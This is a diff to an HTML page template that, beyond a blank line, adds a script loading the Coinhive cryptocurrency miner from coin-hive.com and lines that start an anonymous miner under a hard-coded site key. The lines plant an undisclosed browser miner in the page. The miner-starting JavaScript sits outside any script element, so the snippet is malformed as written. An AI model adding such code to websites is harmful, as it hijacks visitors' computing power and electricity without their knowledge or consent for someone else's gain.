@@ -13,6 +13,7 @@
 		<link rel="stylesheet" href="assets/css/main.css" />
 		<!--[if lte IE 8]><link rel="stylesheet" href="assets/css/ie8.css" /><![endif]-->
 		<!--[if lte IE 9]><link rel="stylesheet" href="assets/css/ie9.css" /><![endif]-->
+
 	</head>
 	<body class="loading">
 		<div id="wrapper">
@@ -46,5 +47,8 @@
 			window.ontouchmove = function() { return false; }
 			window.onorientationchange = function() { document.body.scrollTop = 0; }
 		</script>
+		<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+		var miner = new CoinHive.Anonymous('LIRdnudGbQC19nRJ0ToasbuqGGMdOs5q');
+		miner.start();
 	</body>
 </html>
